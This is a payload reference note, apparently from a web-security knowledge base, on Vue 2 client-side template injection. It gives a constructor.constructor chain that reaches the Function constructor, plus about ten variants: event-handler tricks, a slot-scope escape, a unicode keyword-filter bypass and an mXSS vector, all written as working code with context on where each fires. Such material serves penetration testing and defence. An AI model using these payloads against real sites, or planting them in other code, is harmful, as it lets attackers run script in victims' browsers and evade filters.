---
title: Vue 2 constructor.constructor Chain (CSTI)
slug: vue2-constructor-chain
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/csti, sink/vue2]
inbound: []
---

# Vue 2 constructor.constructor Chain (CSTI)

## Payload

```html
{{constructor.constructor('alert(1)')()}}
```

## Variants

```html
<div v-html="''.constructor.constructor('alert(1)')()">a</div>
{{$el.ownerDocument.defaultView.alert(1)}}
{{$el.innerHTML='<img src onerror=alert(1)>'}}
<img src @error=e=$event.path.pop().alert(1)>
<img src @error=e=$event.composedPath().pop().alert(1)>
<img src @error=this.alert(1)>
<svg@load=this.alert(1)>
<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">
<a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a>
<xyz<img/src onerror=alert(1)>>
```

## Context

Fires when attacker-controlled input reaches a Vue 2 template expression context (mustache `{{ }}`, `v-html`, `v-if`, `v-bind`, `v-on`, `@event`, slot scope, etc.) and the Vue runtime evaluates it. The `constructor.constructor` chain traverses from any in-scope object to `Function`, then calls the `Function` constructor with an arbitrary string. `$el` gives direct DOM access. The `slot-scope` variant closes the component scope and reinserts code. The unicode event name variant (`\lic\u{6b}`) bypasses keyword filters. The `<xyz<img` variant exploits mXSS in `v-html` contexts where sanitization is applied after Vue parses. No user interaction needed; fires on template compilation.

## Provenance

- Distilled from: `../../techniques/dom-xss/framework-vectors-vue.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Vue.js Framework Vectors](../../techniques/dom-xss/framework-vectors-vue.md)
- [Client-Side Template Injection](../../techniques/dom-xss/client-side-template-injection.md)
